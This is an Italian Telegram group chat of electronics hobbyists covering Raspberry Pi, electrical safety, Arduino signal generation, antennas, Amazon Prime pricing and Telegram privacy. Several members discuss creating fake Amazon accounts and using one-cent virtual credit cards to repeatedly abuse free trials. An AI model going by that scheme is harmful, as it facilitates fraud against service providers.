Qualcuno sa come posso scannerizzare oggetti tramite foto e farli diventare stl?
appunto, questi sono 5kHz al massimo
Ok grazie
(123D catch non funziona piu)
con molta sofferenza
Trasmetti pure tanto usiamo la valvola
Kosa
ho 2 valvole proprio qua
ce le ficco a caso li, sperando che si accendano a 3.3v, che dici?
DAI CHE VOGLIO FARE I BUSTI DELLE PERSONE IN 3D
No, dai
Non devo installare la 3.5?
Si lo dice anche Marco nel video
In video i Marco dicono che ci son problemi con questa
ah, installa pure la 3.5 allora
404 - non più
Fixato
Ok ora installo
Mmhh...forse no
Nel senso che devono esplodere?
che è?
Ragazzi ma il rasp regge tranquillamente schermi fullHD?
mi sa che gli servono giusto 446.7v in più per solo farle accendere
fiigo
e perché non si vede l'inoltro?
Rip
perché sono bot ufficiali di Telegram in teoria
ah... figo
Perché ho inoltrato 

continuo a non comprendere
È una "feature" che hanno alcuni client non ufficiali
Client speciali
 come si chiama quella dietro bellissima che sembra Mac OS ?
elementary os?
?
Lui
Ma red star non è quella nord coreana? Haha
Si
yeeep, copia spudorata di os x
ma basata su fedora tipo
A e la frequenza è di 1KHz
Creeedo funzioni
ho un paio di dubbi sulla parte negativa della sinusoide maaaa, proviamo così....poi al massimo vedo, perchè se è per quella non ho idea di come fare :/
Troppo pesante Il video
telegram x?
Daii
Guardaloh è una figata, e ci ho passato 10 minuti di pippe mentali e sfogliamenti del moto armonico (che potrebbe chiedermi nell'interrogazione di dopodomani quindi tecnicamente ho studiato) per riuscire a fare ciò
Buonanotte ragi
È degna di un vicentino
Non la capisco 
Di can
Esatto
Mi deludi
Ma santo cielo 
Meriti un ban immediato
raga
raspberry pi 3 B +
OMG
Per chi fosse interessato vendo oscilloscopio digitale 8 canali con generatore di funzioni Piscope 4000 compreso di 8 sonde...prezzo di listino (senza sonde) 1900€...vendo a 700€...contatti in privato
schifo
è piu potente?
ho visto un vs
fai l'oc al pi3 normale e aggiungi wifi 5GHz e piu o meno avrai il pi3b+
in pratica è solo un pelo meglio del pi3, nulla di speciale
che poi su element 14 vendono il pi3B+ a 29€ su amazon il pi3B a 41€ 
invece io ho fatto scoprire a romboli il rock64 che è una bomba e costa come rpi3
su element costa meno in generale il raspberrypi
è sempre un single board computer?
yes, ma molto molto meglio come hardware
domani mi informo
unica pecca è l'assenza del wifi e l'alimentazione con connettore cilindrico invece che microUsb. Per il resto smerda totalmente il raspberry pi3/3b+
Riesci a mandarmi il link? Io lo trovo a 29€
Si, infatti ho modificato 1 minuto dopo
oddio che lavoraccio..rumen style questo elettricista..ma soltanto io uso i capicorda a puntale?
Io è già tanto se il tizio che ha fatto l'impianto ha usato due fili diversi per neutro e terra
🤔non l'ho mai fatto, non saprei..mi pare si possa fare qualcosa con i transistor
non mi dici niente di nuovo purtroppo..ho visto impianti che sembravano un arcobaleno con tutti quei fili colorati

 CATANIA: Esplosione dopo una fuga di gas in un edificio di via Garibaldi, coinvolti alcuni Vigili del Fuoco: 3 morti, 2 sono Vigili del Fuoco. Altri 2 Vigili del Fuoco feriti gravi 
Ti ho pensato corrado
Quando ho letto la notizia
Sad
non ci volevo credere
bestemmia e capisci 
idem 
Mobogram
Che sono i capicorda a puntale?
Comunque l'ha fatto mio nonno è credo che non l'abbia fatto molto bene siccome è casa sua
ok
E per i vegani...

Ragazzi, ma mi dite perché avendo 12gb di spazio libero su SD e 2gb liberi su memoria di massa play store mi chiede di liberare 200mb per un app che ne pesa 23?
Perché il play store non ti fa installare roba se è libero nella memoria interna meno di una certa percentuale
Quanta memoria ha il tuo telefono? A spanne direi 32GB
Shit
Foto da samas
salve a tutti, scusatemi se vi rompo qui, ho seguito il video di domotica di Overvolt, funziona tutto. Chiedevo, è fattibile usare come server il Raspberry pi Zero W? ho provato, ma quando controllo lo status di switchando mi da le scritte rosse... qualcuno sa perchè?
Pi zero W è un po' diversa la questione perché ha un'architettura arm diversa... Arriva presto il video
ah ok, mille grazie
Ti seguo sempre,  sei un grande!
Penso di si, quasi mai visti usare nel civile, quasi sempre invece nell' industriale
Poco buggato mi dicono
Io non lo questo problema
Neanch'io fortunatamente 
TelegramX giusto? Io nessun problema
Sì, ma si è fixato da solo ora

Scusate ma per quanto riguarda Amazon prime, soltanto per chi si iscrive dopo che hanno alzato il prezzo si paga 34 euro o i prezzi si alzeranno anche per i già abbonati?
Per tutti
Ma da cosa è dovuto questo aumento?
Non so ho visto il messaggio nel canale di overvolt
Grazie
Per lo stesso motivo per cui da 10€ è passato a 20 secondo me
al prossimo rinnovo
se hai già pagato non si alza ancora
Ok,diciamo per questioni interne o comunque ancora sconosciute 
Quando sei l' uomo piu ricco del mondo ma non ti basta ancora...
Beh avevano messo prime video, twitch prime, prime now...
sono questi..io li uso in tutti gli impianti..ci sono sia a puntale, sia ad occhiello
eh lo so, ma io sono un pò fissato sulla sicurezza..isolo tutto il possibile
Onestamente mai visto capicorda su impianti civili🤔
E non ne capisco tanto il senso
sono più sicuri
perchè parecchi si arrangiano a cambiare prese e frutti da sè oppure chiamano "ammiocuggino elettricista" e non voglio morti e feriti sulla coscienza  è semplicemente etica professionale..essendo VVF la sicurezza è la prima cosa che guardo, per questo mi incazzo quando vedo certe cose..tipo quello che ho visto ieri, da strapparmi i capelli! una messa a terra fatta spaccando un pezzo di pilastro e saldando direttamente all'armatura!
usare le puntazze no vero? elettricisti rumen style
Ma non mi risulta che la normativa preveda nulla di ciò, di conseguenza chi è che perde tempo a crimpare tutto?
E non vedo l'insicurezza di un collegamento fatto senza capocorda (se fatto come si deve ovviamente, non con rame che sporge ecc)
Nel senso che hanno bucato un pilastro e ci hanno saldato un cavo sull'armatura?
la maggior parte delle volte pero i collegamenti dono fatti a cazzo con il rame che sporge
il problema è che dalle mie parti sono pochi gli elettricisti che sanno lavorare bene, compresi quelli dell'Enel e di Sielte..ho rischiato parecchi volte di restare appiccicato a impianti che dissipavano sulle carcasse oppure senza terra..da arresto proprio
esattamente
Indecente...
ma se poi lo buchi  anche sotto e metti l'armatura a terra?
intendi la fondazione? tranquillo che fanno anche quello perchè mettere qualche puntazza di dispersione come da normativa è troppo faticoso..meglio spaccare un angolo di pilastro
La messa a terra di casa mia invece è stata fatta saldando il cavo all'armatura delle fondamenta del garage semiinterrato (l'armatira delle fondamenta è stata saldata in un pezzo unico in modo da avere una superfice di disperione maggiore verso terra)
Beh li sono fatti di chi sceglie l'impiantista.
Anche perché la conformità l'hai in mano se non scegli ammiocuggino e sai cosa comporta...
ma è stato sicuramente predisposto quando costruivano..io ti sto parlando proprio di case già finite quasi, in cui stavano facendo le tramezzature interne con i mattoni 0.80
Sisi, predisposto prima di gettare cemento
si ok, ma il problema è anche mio se poi mi chiamano per riparazioni e non so chi ci ha messo mani prima..si devono avere 100 occhi
ogni tanto qualcuno che sa fare il suo lavoro coscienziosamente
Eh, mio papà si è assicurato che i lavori venissero fatti bene contando che lui pur non essendo studiato un po' di conoscenza ed esperienza su impianti elettrici la ha
 altra novità di stamattina  sopralluogo per certificare un officina..Sprinkler scaduti dal 2000 e mai revisionati, e tubo del gas della bombola del cucinino scaduto dal 1998  bravo proprietario, tu si che lavori in sicurezza e affitti con coscienza 
menomale
ah, ovviamente estintori scaduti, che ve lo dico a fare
Indecenza everywere
Qualche settimana fa sono andato da un cliente che sentiva odore di gas in cucina.
Gli ho chiesto quando avesse ristrutturato casa, lui, 1991.
Allora gli ho chiesto se nel 1994 hai sostituito il tubo gas?
LUI:No.
Smonto la cucina, sul tubo c'era scritto"da sostituire entro il 1994"
poi capitano gli incidenti come quello di ieri a Catania e ci perdono la pelliccia dei poveri ragazzi
stessa cosa nel condominio dei miei suoceri..tutti i tubi da sostituire domani..menomale che mio suocero e io siamo fissati con i controlli (VVF entrambi)..ho comprato tutto e faccio il lavoro ai condomini, d'accordo con l'amministratore
Come casa mia guarda
vabbè casa tua è un caso patologico studiato nelle università

 ‎€1‎9.‎99‎ i‎nv‎ec‎e ‎ch‎e ‎€3‎6.‎00
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎4.‎47%

Ma se vi sbrigate avete ancora qualche giorno per iscrivervi a Prime a soli 19.99 

Cos'aspettate?

 

Ma sto music Unlimited?
paghi meno

Sto migliorando: solo 22 minuti di ritardo per il video
È come spotify... non è 100% incluso in Prime ma paghi meno. E se lo fai per il primo mese GRATIS usando il mio link mi danno 4€50 
Ragazzi
Come creo un utente su ubuntu server che possa agire su una sola cartella?
e usare gli screen
ooh crap
chebbbello il comunismo :D
cosa sarebbe sta robba?
Telegram non è più super sicuro-privato-distaccato dalle autorità
Anche nonno li ha, son fighissimi
nel portafrutto che hai postato non c'erano..se li ha nelle altre 503 meglio così
Non li usa spesso
Raga ma se metto le dita nella corrente muoio?
Quindi se scrivo RUSSIA MERDA possono saperlo?
diventi Electro..non hai visto il film ieri sera?
Prova, poi dimmi
io sempre idem i cappellotti
An 96% no. Ma non provare
Chiedo di prestarmi il telefono a gesu
Avrai qualche microsecondo di vita
Ce la puoi fare
Non fa interferenza e cose varie? (Cit.)
Naah
Poi la consideri come donazione ❤️
Ha! Lucri su ogni cosa!!! Ora ti mando TUTUBBO CONTRO!
pubblicità occulta
Anche non occulta
allora mi metto subito a creare account finti
^
Bezos è il tizio più ricco al mondo, ha più di 120 miliardi di dollari... Se gli rubiamo legalmente 4.50€ a testa siamo tutti contenti 

Perché è ricco e infame 
No dai povero, il pacchetto Amazon Prime con tutti i servizi vale tipo 300€ quindi anche a 36 è praticamente regalato
esatto basta pensare a tutte le volte che uno prende qualcosa da 2 o 3 euro con prime e la spedizione è gratis
Cosa sono quelle borse ? 
Aooooooooo
Softbox e ombrelli
Io mi volevo prendere lo studio completo neewer
Perché i softbox artigianali non son bellissimi
Questo si è bruciato
Ops io
Ho dimenticato il mese gratuito

Passiamo alle chat irc
Quelle dove i bimbi ddossano
Giusto
Raga passiamo ai messaggi fisici
Possiamo messaggiarci usando il codice morse con gli attacchi ddos
yeee
in base all'entrata di byte capisci cosa dice
Ora finisco su ignuranza
Attacchiamo una lettera a un piccione e via
Si hahahah
DISCORD
 vai
Daniel's chat?
Ho 5 mb di link onion
ma cambiare l'username in 
 che ogni volta non ti trovo? 
Mai usati
cosa ca
 non puoi averlo fatto
l'avevi fatto te 999 anni fa
e poi mi avevi mollato admin
ma cos
🤨
come faccio ad averlo fatto io e non essere admin?
RAGA IDEA: MESSAGGIAMO VIA IRC USANDO BOT DISCORD
a boh
Voglio inviare una gif :c
ma pfff, facciamo una chat irc basata su connessioni a onde corte, altro che wifi e internetto ù-ù
Si può fareeee
e inviamo direttamente tutto  in codice morse(ho voglia di fare tutto il casino che ci sta intorno ma non un criptamento decente), così anche putin è felice :DDD
0 = "-" e 1 = "." vai è fatta, inizio a scrivere il codice
modulazione dell'ampiezza, mi raccomando
vado a ripassarmi il moto armonico e torno subito
perchè è un capitalista vecchio stampo alla Edison-Jobs
le borse dei softbox e dei treppiedi
li mettono sempre in offerta volendo..io prima li pubblicavo sul canale, ma non se li cagava nessuno
Account fake ogni mese is the way 
Davide Fiorentin:
Uhm che bello... Hanno alzato l'abbonamento di Amazon prime da 19,99 a 36 euro
il problema è che Amazon ha un catalogo sconfinato..per me che faccio tipo 200 ordini annui è indispensabile..ordino anche tantissimi libri e manuali, mi serve il catalogo amazon
a...fac...delle brutte persone già l'hanno fatto, non è abbastanza innovativo, mi devo inventare qualcos'altro🤔
🤔quello che mi domando è: se io faccio 12 account fake con nomi tipo "Ermenegilda Costantino", ma nell'indirizzo di spedizione e come carta di credito metto i miei, potrebbero bloccarmi tutto? perchè se bloccano tutto amen, pago e buonanotte..ma l'aumento del 200% non è che mi vada tanto giù
lo so, il problema sta nel fatto che Amazon quando banna un account, banna anche l'indirizzo..quindi volendo non potrei neanche acquistare con l'account di mio fratello..è una rottura
 il fermoposta alla mia Posta significa perdere 2 ore per ritirare un pacco..età media dei postini 80 anni 
Per quello allora che prime passa da 19 a 36!!!!
e siamo fortunati! mia zia in UK paga 99 sterline se non ricordo male
Sisi, ma anche in usa costa 120 o 130usd mi pare
E niente, anche oggi si studia domani
Ah no wait domani ho il compito, rip
e 70€ li pagano in Crucchia e in MangiaraneLand
Ilvideo è breve, la live alle 17
Appunto, dovevo studiare
Studi fino alle 17
Passerò italiano a domani e oggi farò solo matematica
Gia basta
Hahaha 
 🤔 Marcuzzo ma qualche bell'adesivo Overvoltoso da appiccicare sui portatili quando hai intenzione di farlo? ti sto facendo un sacco di pubblicità tra i colleghi
penso che anche molti ragazzi del gruppo sarebbero interessati
se è in tinta con il mio portatile bianco e con lo stiker nuovo di speck & teck allora sono interessato
Thx
Mmmh potrebbe non essere una mala idea 
È smorto quello di speck
Figurati Marco


SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII – 38
 88%

No – 3
 7%

Meh 🤔 – 2
▫️ 5%

 43 people voted so far.
Lo scarico solo perché sei tu
hahahah
fissalo in alto che sono curioso di vedere i risultati
Cosa sarebbe?
ho fatto un codice che fa onde sinusoidali :D dall'
Fai un function generator
a e....tra l'laltro...credo che non funzioni...o boh, non so, per trasmettere trasmetto solo la semionda positiva mi sa, quella negativa è inesistente qua.... boh, non saprei, perchè prende anche valori negativi infondo il sin(wt) però dovrebbe funzionare solo per valori tra 0.0 e 1.0 però non mi ha dato errori...quindi boh, mi fa strano ._.
Cista
quello bianco e rosso è bello, e ci sta sul mio pc

 ‎€2‎54‎.9‎9 ‎in‎ve‎ce‎ c‎he‎ €‎38‎9.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎4.‎62%
⭐️‎ 4‎.3‎0 ‌‎/‌‎ ‎5.‎00‎ (‎55‎ r‎ec‎en‎si‎on‎i)
 


Si, per essere da amazon come prezzo è top
Peccato che sono poveroooh
Sticker preferito da Giulian ahhaah
a proposito di pc, guardate che ho trovato ieri buttato accanto all'indifferenziato  gente incivile
Deve sostituirlo con
Perché è MIO
bhe beh beh...potrei pensarci su, mettici altri 2/3 sticker e ci siamo
Dimmi cosa vuoi
vecchiotto lui
Dai c'è pure Elon Musk
ok...ok....ok....perchè la cassa spiaccicata sul case?
Da file manager:




per simulare il rumore delle ventole vecchie?
mi piangeva il cuore lasciarlo li..ora lo sistemo e lo regalo a papà
🤔cassa? what cassa?
è un vecchio P4 dissipato passivamente da quello che vedo senza smontarlo..vecchie glorie❤️
io a casa ho un pc fatto con case e lettore cd recuperati e il resto lo comprai di seconda mano per risparmiare
quella al centro in alto, davanti ci passa un cavo di quelli piatti di cui ignoro il nome da quanto sono oramai inutilizzati, 
 cassa
io ho una mobo mai tolta dalla confezione che avrà 15 anni tipo
ah quello è il cicalino degli errori
trovata in cantina da mio nonno....è magico quel posto
apposct
lo voglio restaurare..poi prendo una scheda video da 10€ e lo porto nel 21esimo secolo
una 750ti e via
altrimenti se vuoi ti regalo una gt520 bruciata regalatami dal prof di cad
 come minimo oggi nella live devi parlare di quello che sta succedendo a Facebook. Stavi scattando quando hai detto de progetto di settembre.....ma io ho già Delle anteprime esclusive 
Ci sono delle banche che fanno carte di credito virtuali a 1 centesimo, in teoria così puoi farti un po' di soldi (non credo sia molto legale però vabbè)
vladimir putin
GT710
raga ma... vi ricordate picasa?
🤔la cosa mi interesserebbe alquanto, per il discorso dei fake account Prime
Si, ma io intendo quello detto ultimamente riguardi le ricerche
E continuerà
Facebook indagherà su Cambridge Analytica | Webnews



insomma, dipende..per uso professionale (pagine di negozi e ditte, rappresentanti, pubblicità, pagine ufficiali di aziende) è ottimo..mentre per la pubblicità a breve termine Instagram è il top
Ma come ha detto Andrea magari fallisce
vabbè sui gruppi di discussione hai pienamente ragione, fanno più schifo delle vecchie chat Irc..sulle pagine delle aziende dipende, ovviamente se pagano hanno un servizio migliore, mi pare ovvio
Io usavo questo metodo per fare le prove gratuite di Netflix
(Le carte erano di un mio amico)
devo cercare più info
ragazzi
ho scassato la pedaliera del volante che avevo e devo costruirmene un'altra
che mi consigliate di fare?
In teoria non è legale, forse controllano anche se quel dispositivo ha già fatto la prova. Se non hanno sistemi di sicurezza sono soldi facili
Ho un codice scritto in JavaScript, come lo eseguo sul PC?

la 730 o la 1060 da 3GiB, nuove meme ufficiali di nvidia
Puoi provare ad eseguirlo con node
Ho provato ma mi da errore
Non posso devo utilizzarlo per forza da linea di comando, senza usare il browser 
Nel browser gia l'ho provato in una pagina HTML è funziona ma da linea di comando non va e mi da errore
Eh già
Belloh
Minchia, 10 cents, con 1€ te ne fai 10 O.O
*più la spedizione*
vedi che sono 99 euro di spedizione al pezzo
Non al pezzo, ne prendi tipo 20€(200!) e la spedizione è niente in confronto
beh, beh, beh, vengono dall'america?
Boh
Voglio vedere come si programmano 200 PC minuscoli
Wireless 
Soprattutto per comunicare con il protocollo Ethereum
Che c'entra ethereum xD
 
Costo?
circa 250 $
Mhm non so se conviene
Me ne faccio mandare 4-5 e poi faccio il big giveaway

Siii
cos'è tutto sto ricchiume
Ragazzi, perché visual studio segnala come errore else?
perchè non sai programmare :D
Oggi parla di Facebook! Sennò ti  toruro nei commi
Questo è ovvio, sennò non starei a chiedere a voi 
Cosa c'è da dire su Facebook?
Tutto quello che sta succedendo in questi giorni
Dove sei finito romboli!!!
Alle 17:30!
Gli account violati?
ook ci sono riuscito gente
Yeeee
Approvato 
cosa
da notare il *poggiagomiti* aka libro di fisica con in copertina einstein triggheratissimo
E non posso fare di io e poi ci lo da si può tipo a SD che ho lo in a la fai a un mio nome finisce al posto mentre io GP alle non posso sono al a la un solo il mio r nome al finisce col al posto mentre GP non se ci la un mia CPU a la fai mia CPU a la mia fai un a SD un mia mio r nome finisce col al posto finisce rimanenti vegani
Yay
ma è un PWM con un condensatore o hai un DAC?
o un 
dicasi DAC
digital to analog converter
si ma 
 fa molto più figo
comunque...il suono è un po' distorto, probabilemente è perchè non ho contato i tempi di esecuzione, ora però non saprei come fare per risolvere tipo🤔🤔🤔
a e per la cosa della semionda negativa ho risolto ponendo il centro, ossia x=0, a 1.65v e poi A sta a 3.3v e -A sta a 0.0v
Ecco appunto...
credo vada bene comunque, e poi l'ampiezza non è sempre A=3.3 e -A=0, scelgo io con il potenziometro
Ho finito i 32 GB di mi A1
Si, ma è vuota .-.
Aspetta ma è la sd?
No
Memoria di massa
La SD è da 16GB e ce ne sono 12 liberi
Ah lol
Che telefono era
Ultimatum russo a Telegram: consegnare i codici o chiudere




Condiviso dal mio feed Google
È vero o è una bufala?
È, vorresti dire
È un NGM M500
Un beneamato ammasso di merda xD
Ma porco
Ma un app di messaggistica normale no?
Gli faceva troppo schifo?
La privacy? Cos'e??? Noi diciamo che crittografiamo i messaggi. Ma ke significa???
Sempre la form 2
Se non succede quanto tieni il volume basso è qualcosa che non puoi risolvere, è il clipping fatto dall'arduino
nooope, rimane sempre e comunque, è che comunque gli serve tempo per eseguire il codice e quindi c'è l'onda che tipo è scostata...a causa dei tempi....credo che abbassando di un paio di decimi di microsecondo il tempo per i primi tot punti(tipo da 0 a 36) dovrebbe andare🤔 dopo provo, ora sto bestemmiando perchè gli esercizi sul momento della forza sono impossibili
Eheh
giusto per sfigurare ancor più l'onda
Io sono fermo ancora a quello d'inerzia

 facci un salto giù in veneto a farci ripetizioni please
beh quello d'inerzia è una cagata, anche il teorema di steiner, sono gli esercizi sul momento della forza che non riesco a fare, sono tutti un casino
nel dubbio ci butto un paio di conti sul momento angolare a caso per prendere quel mezzo voto in più di "ragionamenti ulteriori"
Prova il 30 della scheda, poi mi spieghi perché il braccio lo consideriamo come unico e perché facciamo la somma dei momenti senza contare quel 1/3 che invece dovremmo
wait...scheda?
Moodle
a
A
Telegram verrà bannato, come WhatsApp
Mi mette tristezza questa cosa
(Che i russi continuano a votare Putin perché ovviamente gli fanno arrivare solo le news approvate dal governo)
mmhh....aaaspetta, quanto è lungo? 1m?
Posso farci un interruttore? (Sensore per porta)
Nop
e allora non puoi avere un risultato su quell'esercizio
perchè non ti da "l", ti rimane la variabile
Wrong
Quello delle 2 masse e 2 asticelle da 5.6cm
comunque io boh, sto tentando di fare gli esercizi più banali di sto mondo sulla prima scheda ma ci sono tutti i risultati sbagliati quindi
stiamo parlando di 2 esercizi diversi
anche perchè non è possibile che sia io a sbagliare, sono applicazioni delle formule....
Che uomo saccente
no ma tipo un risultato è giusto ma l'altro è sbagliato e si differenziano per una costante...quindi sbagliare non è proprio un'opzione
però da comunque fastidio
si ma che cristo è tutta sta roba, tutti e dico tutti gli esercizi del momento della forza sono roba mai vista, non li abbiamo mai fatti e mai abbiamo nemmeno parlato di come farli, sul libro non si citano neppure e su internet sono introvabili, io mi arrendo
Non ti arrendere!
tornio
Così si fa
Crea un pezzo al tornio e ti sollevi
faccio un piedistallo
Ah
Cosa tornisci generalmente?
Ferro ottone alluminio legno?
Io alluminio di solito
È il materiale che trovo più facilmente
(E che ho sempre)
È un nome bot e telegram per mining(credo) di criptovalute...me lo hanno condiviso ... secondo voi può essere una truffa???
Lo è 
Perchè quando arrivi all’importo per il ritiro ti dice che devi avere dei punti speciali e per averli devi depositare dei soldi
Ciao a tutti
Un Bot Telegram non può eseguire Mining di cryptovalute
E' fisicamente impossibile
Ok grazie
Non che prima lo fosse
Lo è ancora
Hai visto i video delle vecchie che falsificano i voti nei seggi, una ha coperto le videocamere con dei palloncini
Come fa ad essere sicuro se è proprietario e russo?
Telegram non ha nessun server in Russia
L'ha dichiarato Durov in un Tweet
Eh, quindi è chiaramente sicuro
Cosa significherebbe?
Telegram non ha server, cdn, uffici o centri operativi in Russia
È stato minacciato dal KGB più volte
È stato buttato fuori dalla sua società di vkontakte perché il governo russo voleva prenderne il controllo
Adesso c'è un processo in corso perché la Russia vuole i codici e Telegram si rifiuta di concederglieli
No ti giuro, avevo letto Proletariato.
Sarà bloccato in Russia, ed è stato bloccato in Pakistan l'anno scorso
Ha avuto anche problemi con la Cina
E WhatsApp no, niente di tutto ciò, io direi che si, è abbastanza sicuro
Sta avendo problemi anche in Iran
Mi pare sia bloccato
ma... telegram x non ha il multi-account?
Nope
quindi al momento solo telegram normale ha questa funzione?
E altri client
Non ufficiali
tipo?
Multigram
Anche Telegraph se non sbaglio
Mobogram 2 se non sbaglio
comunque ho notato che telegram x è molto più veloce di telegram normale
Merito di tdlib
Da cosa potrebbero essere causati secondo voi i problemi di connessione che ho ormai da più di una settimana?

In pratica in maniera del tutto casuale la connessione a internet smette di funzionare per qualche minuto, anche se la barra di windows mi dice che sono correttamente collegato in wifi la connessione non c'è (le pagine web caricano all'infinito) e la soluzione che ho trovato per risolvere la cosa è disconnettermi dalla rete e riconnettermi subito dopo.
Questo scherzo lo faceva spessisimo fino a ieri, poi ho aggiornato i driver e a occhio lo fa un po di meno, ma non ha smesso di farlo. Inoltre lo fa a volte in maniera del tutto casuale, ma spesso quando inizio a vedere un video su youtube o quando inizio a scaricare un file. Ultima considerazione, queste "disconnessioni" avvengono spessisimo con la mia rete di casa, mentre con la rete che ho a scuola lo fa raramente.

I driver della scheda di rete sono aggiornati (o almeno spero, li ho aggiornati ieri tramite driver booster) e le reti funzionano benissimo con altri computer
non ho installato nulla di strano negli ultimi tempi, per cui escludo che il problema possa provenire da programmi o robe del genere
hey alla fine sono riuscito a trasmettere e funziona....almeno, c'è un pelo di errore nelle sinusoidi a causa del tempo che è calcolato male(non ho contato il periodo di esecuzione del codice) ma poi risolvo, non è un problema, comunque...per l'antenna....piuttosto che fare un'antenna lunga 1km, la tengo come piano B tanto 1km di fil di rame lo trovo ma pesa, coosa potrei fare?
anche un sottomultiplo della lunghezza di 1km credi possa andar bene?🤔
che frequenza hai in uscita?
1KHz, non voglio spingermi di più, potrei benissimo arrivare fino a tipo 13MHz ma voglio tenermi il più basso possibile :/
e il segnale è tutto su un cavo unico
Tantissimo
Dove si trovano i Raspberry al minor prezzo? Ho visto che su Rs online c’è il b+ a 30€
se f=1kHz, la lunghezza d'onda è di circa 300km
nel senso che non ho usato 2 cavi, uno in "out" e uno in "in", ho fatto tutto con uno ponendo x=0 a 1.65v A=3.3v e -A=0.0v tipo, può andare comunque no?
Son ostativi bannato da Apple Italia
aaappunto, un pelo tantino
anche se facessi un dipolo da quarto d'onda arriveresti a 75km
con ampiezza massima questo
si ma tipo usando un cavetto qualunque non funzionerebbe la trasmissione? no perchè da quel che so io, trasmettendo a frequenze relativamente alte(sulla banda fm) uso un po' cavetti a caso senza troppi conti, funziona comunque la trasmissione...so che è sbagliato ma hey funziona
ora non ho una radio am qua per provare comunque....credi andrebbe comunque? provo a trovare tipo il cavo più lungo che ho e uso quello
Sapete mandarmi un circuito per trasmettere in FM a qualche watt?
ooppure....a sto punto potrei alzare la frequenza, mo' faccio 2 conti e vedo fino a cosa riesco ad arrivare
ok, ma una cosa è avere un cavo da 20cm con lunghezza d'onda di 2m, un'altra è usare 20cm di cavo con una lunghezza d'onda di 300km
mmhh....già, beh, vedo cosa riesco a trovare, provo a stare il più vicino possibile con le misure ideali
ti conviene abbandonare l'idea di fare un modulatore e sintetizzatore totalmente software e capire che riesci a fare cose fatte bene solo con hardware dedicato apposito
si lo so ma se ci riesco così tutto software è una cosa epica dai
beh nsomma, avevano messo in palio 300.000$ per chi riuscisse a estrapolare un messaggio di Telegram dai loro server
beh dai, mi tiro su a 5MHz, al massimo, e uso un'antenna da 1m tipo, dovrebbe starci
non è russo, guarda le FAQ, sono il più possibile distaccati
riusciresti a fare qualcosa di decente al limite inferiore della banda radioamatoriale con un dsp di quelli buoni
poi scopri che putin vuole vedere i messaggi di telegram solo per prendersi quei 300'000$, altro che social engineering
Ma scusate
Non è tipo illegale farlo?
Nel senso
Io lo manderei a fare in culo
intendi sulla LF, sui 135KHz?

esatto, è contro le norme sulla privacy. Solo che o telegram consegna le chiavi o la  russia banna telegram dalla sua rete
no, c' è una legge russa di qualche anno fa
Dovrebbero fare delle regole internazionali sulla privacy
si lì intorno
probabilmente la seconda
ma pure li ci serve un'antennona gigante no?
molto probabile
una bella filare ci vuole si
Ma ci sono talmente tanti clienti in Russia che non gli conviene farsi bloccare?
beh dai, mi inventerò qualcosa
in realtà con il giusto dsp riusciresti ad arrivare a qualce decina di MHz senza spendere una fortuna (quelli superiori costano tanto, sono hardware usato per generatori di funzioni arbitrarie)
sbaglio o i dsp partono diretti da prezzi abbastanza alti
non ne trovo uno a meno di 300 euro...
non ricordo i prezzi, ma un dsp decente non dovrebbe superare i 10€ (poi bisogna farsi il pcb fatto decentemente e saldarci su i componenti)
a ok, allora sono io che cerco male, mo' provo a cercarne su sta fascia
 tu fai solo il corso di arduino (quello dopo scuola intendo) o anche gli altri 2?
Ci sono anche molti clienti che lo usano per la "privacy" che offre
Altri due quali?
(ci sarò a un corso che parte a metà aprile tipo comunque)
e molti per risparmiare soldi vanno di tor
Eh beh grazie al cazzo secondo te quanta gente si è messa a farlo? E loro quanto pagherebbero un team di un numero di persone infinitamente minore per farlo? Le group chat e le chat normali sono già state bucate e l'end to end non è così sicuro visto che l'algoritmo l'hanno scritto loro.

È chiaro che basandosi sulle cose che scrivono loro sembra tutto sicuro, inoltre il fatto che abbiano messo in palio 300k non sta a significare nulla sul proprio livello di sicurezza, significa solo che hanno preferito dare 300k a una persona su migliaia che ci hanno provato rispetto a pagare un team 3 volte tanto.


qui ce ne sono una fila, filtra quello che piu si avvicina a quello che vuoi 
Com'è che sono state "bucate" le chat e i gruppi?
Ragazzi come scegliere una micro sd a parte per lo spazio?
Avete qualche circuito per un amplificatore in TX FM?
Ho un TX da 1000mw
banda su cui lavori? Potenza target?
88-108mhz
Un 10w vanno bene
banda commerciale, hai i permessi adatti?
altrimenti ciaone
È a scopo dimostrativo
Seriamente, sto facendo Delle prove
e allora rimani con potenze basse
comunque generalmente parlando è meglio avere una buona antenna piuttosto che un buon amplificatore
c'è gente che con 5W riesce a comunicare con l'inghilterra in CW lento
Ok, però vorrei un po' amplificare
Che antenna?
88-108MHz significa essere attorno ai 3m di lunghezza d'onda. La cosa piu semplice penso sia calcolarsi una antenna verticale mezz'onda
1.5m di antenna circa
Vabbene quella telescopica Delle radio FM cinesi?
sono 1/8 di onda avvolte a bobina, quindi non il massimo ma meglio di niente
Classe e velocità dichiarata e affidabilità
Come posso amplificarlo però?
comunque con un centinaio di mW sulla tua stessa banda di frequenza con un pezzo di filo da qualche metro buttato a caso (senza misurarlo) facevo quasi 100m con ostacoli
Vorrei farci almeno 5w
Affidabilità sandisk o Samsung (?) classe cioè?
amplifichi con il guadagno dell'antenna
Se mi costruisco un antenna fai da te?
SanDisk va bene ma anche Samsung, classe 10 vuole dire che garantisce 10mb/s in scrittura
Tutto sui server di telegram, i server di telegram vengono bucati, tutto viene bucato. Il governo chiede informazioni a Telegram, Telegram può dargliele e spesso deve dargliele. La scenetta del "siamo bravi non abbiamo permesso che ciò accadesse" è appunto una scenetta.

Il 99% delle comunicazioni che avvengono su Telegram non sono end to end e comunque anche l'algoritmo end to end è stato scritto da 6 loro matematici, non sia mai che 1 crittografo potesse rovinare tutto.
Che ne pensi di questa antenna?
Ok grazie mille
Dovrebbe essere FM
ci sono 2 tipi di radioamatori: quelli che spendono centinaia di euro di antenne che non vanno molto, e quelli che con qualche decina di € si calcolano e costruiscono antenne che vanno a meraviglia
Trasmettevo con il rasp e non trasmetteva nulla
e calcolando che arrivi a fare questo discorso sarai sicuramente della seconda categoria
avessi tempo sarei di quella categoria
tipo io col rasp, 200mW e 20cm di jumper
all'inizio di un libro famoso di radiantistica veniva detto: "meglio spendere 100 di antenna e 1 di radio che 100 di radio e 1di antenna". Perché è l'antenna che effettivamente irradia le onde eletromagnetiche e non la radio
hardware tanto sbagliato quanto la qualità dell'antenna
^
si...ma intanto fino a 10m di raggio li fa
